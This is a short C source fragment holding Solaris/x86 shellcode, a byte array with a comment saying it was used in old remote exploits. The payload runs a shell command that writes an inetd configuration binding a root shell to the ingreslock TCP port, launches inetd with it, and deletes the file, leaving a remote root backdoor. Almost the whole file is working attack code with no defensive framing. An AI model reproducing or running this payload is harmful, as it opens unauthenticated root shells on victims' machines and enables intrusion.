/*
 *  Solaris/x86
 *
 *  Just execve()'s the following:
 *   "echo \"ingreslock stream tcp nowait root /bin/sh sh -i\">/tmp/x;"
 *   "/usr/sbin/inetd -s /tmp/x; /bin/rm -f /tmp/x";
 *
 *  for a trivial remote bd. Used in a few old Solaris/x86 remote exploits.
 */

char c0de[] =
"\xeb\x3d\x9a\x24\x24\x24\x24\x07\x24\xc3\x5e\x29\xc0\x89\x46\xbf\x88\x46\xc4"
"\x89\x46\x0c\x88\x46\x17\x88\x46\x1a\x88\x46\x78\x29\xc0\x50\x56\x8d\x5e\x10"
"\x89\x1e\x53\x8d\x5e\x18\x89\x5e\x04\x8d\x5e\x1b\x89\x5e\x08\xb0\x3b\xe8\xc6"
"\xff\xff\xff\xff\xff\xff\xe8\xc6\xff\xff\xff\x01\x01\x01\x01\x02\x02\x02\x02"
"\x03\x03\x03\x03\x04\x04\x04\x04"
"\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x63\x20"
"echo \"ingreslock stream tcp nowait root /bin/sh sh -i\">/tmp/x;"
"/usr/sbin/inetd -s /tmp/x; /bin/rm -f /tmp/x";

/* EOF */





